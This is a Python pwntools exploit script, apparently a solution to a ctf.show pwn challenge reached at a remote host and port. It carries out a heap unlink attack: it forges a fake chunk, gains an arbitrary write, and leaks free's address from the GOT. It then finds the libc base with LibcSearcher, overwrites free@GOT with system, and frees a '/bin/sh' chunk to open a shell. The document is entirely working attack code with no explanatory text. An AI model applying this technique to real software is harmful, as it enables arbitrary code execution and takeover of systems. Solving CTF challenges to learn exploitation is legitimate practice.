from pwn import *
from LibcSearcher import * 
context.log_level="debug"
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28173)
elf = ELF('./pwn')
free_got = elf.got['free']
def add(length,context):
        io.recvuntil("Your choice:")
        io.sendline("2")
        io.recvuntil("Please enter the length:")
        io.sendline(str(length))
        io.recvuntil("Please enter the name:")
        io.send(context)
def edit(idx,length,context):
        io.recvuntil("Your choice:")
        io.sendline("3")
        io.recvuntil("Please enter the index:")
        io.sendline(str(idx))
        io.recvuntil("Please enter the length of name:")
        io.sendline(str(length))
        io.recvuntil("Please enter the new name:")
        io.send(context)
def delete(idx):
        io.recvuntil("Your choice:")
        io.sendline("4")
        io.recvuntil("Please enter the index:")
        io.sendline(str(idx))
def show():
        io.sendlineafter("Your choice:", "1")
add(0x40,'a' * 8)
add(0x80,'b' * 8)
add(0x80,'c' * 8)
add(0x20,'/bin/sh\x00')
#gdb.attach(io)
ptr = 0x6020a8
fd = ptr-0x18
bk = ptr-0x10
fake_chunk  = p64(0)
fake_chunk += p64(0x41)
fake_chunk += p64(fd)
fake_chunk += p64(bk)
fake_chunk += '\x00'*0x20
fake_chunk += p64(0x40)
fake_chunk += p64(0x90)
edit(0,len(fake_chunk),fake_chunk)
#gdb.attach(io)
delete(1)
log.info("free_got:%x",hex(free_got))
payload = p64(0) + p64(0) + p64(0x40) + p64(free_got)
edit(0,len(fake_chunk),payload)
#gdb.attach(io)
show()
free = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) 
log.info("free addr is:%x",free)
libc = LibcSearcher('free',free)
libc_base = free - libc.dump('free')
system = libc_base + libc.dump('system')
edit(0,0x8,p64(system))
#gdb.attach(io)
delete(3)
io.interactive()
